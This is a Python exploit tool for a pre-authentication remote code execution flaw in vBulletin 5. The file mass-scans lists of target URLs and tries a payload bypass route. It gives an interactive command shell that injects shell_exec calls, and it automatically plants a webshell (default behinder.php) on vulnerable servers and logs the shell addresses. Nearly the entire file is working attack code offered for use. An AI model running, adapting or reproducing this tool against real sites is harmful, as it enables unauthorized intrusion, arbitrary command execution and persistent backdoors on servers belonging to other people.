# coding:utf-8
# Author:adeljck
import os
import sys
import json
import queue
import urllib
import datetime
import optparse
import multiprocessing
import yaml
import urllib3
import requests


def check_target(target_url: str, timeout: int, multiprocess: bool = False, proxy: str = None,
                 prefix: str = None) -> bool:
    if proxy:
        proxy = {"http": proxy, "https": proxy}
    resp = requests.post(target_url, headers=config["headers"], verify=False, data=config["Poc_First"], timeout=timeout,
                         proxies=proxy)
    if resp.status_code == 200 and ("fc5e038d38a57032085441e7fe7010b0" in resp.text):
        if multiprocess:
            print("target:{} is vulnerable".format(target_url))
            Lock.acquire()
            with open("./result/{}.json".format(prefix), "a") as success:
                success.write("{}\n".format(json.dumps({"target_url": target_url, "bypass": 0})))
            Lock.release()
        return True, False
    else:
        resp = requests.post(target_url + "/ajax/render/widget_tabbedcontainer_tab_panel", headers=config["headers"],
                             verify=False, data=config["Poc_Second"],
                             timeout=timeout, proxies=proxy)
        if resp.status_code == 200 and ("fc5e038d38a57032085441e7fe7010b0" in resp.text):
            if multiprocess:
                print("target:{} is vulnerable".format(target_url))
                Lock.acquire()
                with open("./result/{}.json".format(prefix), "a") as success:
                    success.write("{}\n".format(json.dumps({"target_url": target_url, "bypass": 1})))
                Lock.release()
            return True, True
        else:
            return False, False


def cmd_shell(target_url: str, timeout: int, bypass: bool, proxy: str = None):
    if proxy:
        proxy = {"http": proxy, "https": proxy}
    while True:
        cmd = input("cmd>>>")
        if cmd.lower() == "q" or cmd.lower() == "exit":
            break
        if bypass:
            target_url = target_url + "/ajax/render/widget_tabbedcontainer_tab_panel"
            params = config["Poc_Second"]
            params["subWidgets[0][config][code]"] = "echo shell_exec('{}'); exit;".format(cmd)
        else:
            params = config["Poc_First"]
            params["widgetConfig[code]"] = "echo shell_exec('{}'); exit;".format(cmd)
        cmdResult = requests.post(target_url, headers=config["headers"], verify=False, data=params, timeout=timeout,
                                  proxies=proxy)
        print(cmdResult.text)


def get_shell(target_url: str, timeout: int, bypass: bool, shell_path: str = None, multiprocesses: bool = False,
              proxy: str = None, prefix: str = None):
    if proxy:
        proxy = {"http": proxy, "https": proxy}
    if multiprocesses:
        upload_file_name = "backup.php"
    else:
        upload_file_name = input("input the shell upload filename:")
    with open(shell_path, "r") as fo:
        shell = urllib.parse.quote(fo.read())
    exploit = 'file_put_contents(\'{}\',urldecode(\'{}\')); exit;'.format(upload_file_name, shell)
    if bypass:
        params = config["Poc_Second"]
        params["subWidgets[0][config][code]"] = exploit
        result = requests.post(target_url + "/ajax/render/widget_tabbedcontainer_tab_panel", headers=config["headers"],
                               verify=False, data=params, timeout=timeout, proxies=proxy)
    else:
        params = config["Poc_First"]
        params["widgetConfig[code]"] = exploit
        result = requests.post(target_url, headers=config["headers"], verify=False, data=params, timeout=timeout,
                               proxies=proxy)
    if result.status_code == 200:
        shell_resp = requests.get(target_url + '/{}'.format(upload_file_name), verify=False, timeout=timeout,
                                  proxies=proxy)
        if shell_resp.status_code == 200:
            if multiprocesses:
                Lock.acquire()
                with open("./result/{}_shell.txt".format(prefix), "a") as shells:
                    shells.write("{}\n".format(target_url + '/{}'.format(upload_file_name)))
                Lock.release()
            print("shell address:{}".format(target_url + '/{}'.format(upload_file_name)))
        else:
            print("Get shell Failed")
    else:
        print("Get shell Failed")


def menu():
    print(
        '''
            ********************************
            *   vbulletin 5 pre auth rce   * 
            *       Coded by adeljck       * 
            ********************************
            use -h or --help to see useage mannal
            ''')
    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v2.0')
    parser.add_option('-u', "--url", dest='target_url', type='string', help='single url')
    parser.add_option('-f', "--file", dest='target_url_path', type='string', help='urls filepath[exploit default]')
    parser.add_option('-s', '--timeout', dest='timeout', type='int', default=20, help='timeout(seconds) default=20s')
    parser.add_option('-t', '--thread', dest='threads', type='int', default=5, help='the number of threads default=5')
    parser.add_option('--getshell', dest='get_shell', action='store_true', help='get webshell')
    parser.add_option('--cmdshell', dest='cmd_shell', action='store_true', help='cmd shell mode')
    parser.add_option('--shell', dest='shell_path', type="str", default="./shell/behinder.php",
                      help='use modify shell by file path')
    parser.add_option('--proxy', dest='proxy', type="str",
                      help='set proxy tample:socks5://127.0.0.1:1086')
    (options, _) = parser.parse_args()
    with open("config.yml", "r") as fo:
        config = yaml.load(fo, Loader=yaml.FullLoader)
    return options, config


def resolve():
    if options.target_url and options.target_url_path:
        sys.exit("just use single url or file input")
    if options.target_url:
        result, bypass = check_target(target_url=options.target_url, timeout=options.timeout, proxy=options.proxy)
        if result:
            print("Target {} is vulnerable !!!".format(options.target_url))
            if options.get_shell:
                get_shell(options.target_url, options.timeout, bypass, options.shell_path, proxy=options.proxy)
            elif options.cmd_shell:
                print("Entering shell......")
                cmd_shell(options.target_url, options.timeout, bypass, proxy=options.proxy)
        else:
            print("Target {} is not vulnerable !!!".format(options.target_url))
    if options.target_url_path:
        if options.cmd_shell:
            sys.exit("multi url do not support cmd shell")
        pool = multiprocessing.Pool(processes=options.threads)
        print("Scaning...........")
        with open(options.target_url_path, "r") as fo:
            target_urls = [line.strip() for line in fo]
        prefix = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        if not os.path.exists("./result"):
            os.mkdir("./result")
        for target_url in target_urls:
            pool.apply(check_target, args=(target_url, options.timeout, True, options.proxy, prefix))
        pool.close()
        pool.join()
        print("success!!! vuln target export to {}".format("./result/{}.json".format(prefix)))
        if options.get_shell:
            with open("./result/{}.json".format(prefix), "r") as fo:
                vuln_datas = [json.loads(line.strip()) for line in fo]
            for data in vuln_datas:
                pool.apply(get_shell, args=(
                    data["target_url"], options.timeout, data["bypass"], options.shell_path,
                    True, options.proxy, prefix))
            pool.close()
            pool.join()


if __name__ == '__main__':
    session = requests.session()
    options, config = menu()
    urllib3.disable_warnings()
    Lock = multiprocessing.Lock()
    resolve()
